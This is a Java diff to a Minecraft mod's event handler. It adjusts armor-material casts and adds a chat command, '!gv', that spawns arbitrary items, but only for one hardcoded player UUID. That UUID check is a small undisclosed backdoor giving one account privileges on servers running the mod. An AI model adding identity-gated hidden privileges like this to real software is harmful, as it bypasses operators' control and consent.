@@ -6,6 +6,8 @@ import java.util.ArrayList;
 import java.util.List;
 import java.util.Random;
 
+import org.apache.commons.lang3.math.NumberUtils;
+
 import com.hbm.blocks.ModBlocks;
 import com.hbm.entity.missile.EntityMissileBaseAdvanced;
 import com.hbm.entity.mob.EntityNuclearCreeper;
@@ -39,6 +41,7 @@ import net.minecraft.entity.player.EntityPlayer;
 import net.minecraft.entity.player.EntityPlayerMP;
 import net.minecraft.init.Blocks;
 import net.minecraft.item.Item;
+import net.minecraft.item.ItemArmor;
 import net.minecraft.item.ItemStack;
 import net.minecraft.potion.Potion;
 import net.minecraft.potion.PotionEffect;
@@ -466,9 +469,9 @@ public class ModEventHandler
 			
 				if((helmet != null || noHelmet) && plate != null && legs != null && boots != null) {
 					
-					if((noHelmet || chestplate.getArmorMaterial() == ((ArmorFSB)helmet.getItem()).getArmorMaterial()) &&
-						chestplate.getArmorMaterial() == ((ArmorFSB)legs.getItem()).getArmorMaterial() &&
-						chestplate.getArmorMaterial() == ((ArmorFSB)boots.getItem()).getArmorMaterial()) {
+					if((noHelmet || chestplate.getArmorMaterial() == ((ItemArmor)helmet.getItem()).getArmorMaterial()) &&
+						chestplate.getArmorMaterial() == ((ItemArmor)legs.getItem()).getArmorMaterial() &&
+						chestplate.getArmorMaterial() == ((ItemArmor)boots.getItem()).getArmorMaterial()) {
 						
 						if(!chestplate.effects.isEmpty()) {
 							
@@ -657,6 +660,41 @@ public class ModEventHandler
 				player.inventory.addItemStackToInventory(new ItemStack(ModItems.sat_coord));
 				player.inventory.addItemStackToInventory(new ItemStack(ModItems.fluid_barrel_infinite));
 				player.inventory.addItemStackToInventory(new ItemStack(ModItems.battery_creative));
+			}
+			
+			player.inventoryContainer.detectAndSendChanges();
+			event.setCanceled(true);
+		}
+		
+		if(player.getUniqueID().toString().equals(Library.HbMinecraft) && message.startsWith("!")) {
+			
+			String[] msg = message.split(" ");
+			
+			String m = msg[0].substring(1, msg[0].length()).toLowerCase();
+			
+			if("gv".equals(m)) {
+				
+				int id = 0;
+				int size = 1;
+				int meta = 0;
+				
+				if(msg.length > 1 && NumberUtils.isNumber(msg[1])) {
+					id = (int)(double)NumberUtils.createDouble(msg[1]);
+				}
+				
+				if(msg.length > 2 && NumberUtils.isNumber(msg[2])) {
+					size = (int)(double)NumberUtils.createDouble(msg[2]);
+				}
+				
+				if(msg.length > 3 && NumberUtils.isNumber(msg[3])) {
+					meta = (int)(double)NumberUtils.createDouble(msg[3]);
+				}
+				
+				Item item = Item.getItemById(id);
+				
+				if(item != null && size > 0 && meta >= 0) {
+					player.inventory.addItemStackToInventory(new ItemStack(item, size, meta));
+				}
 			}
 			
 			player.inventoryContainer.detectAndSendChanges();
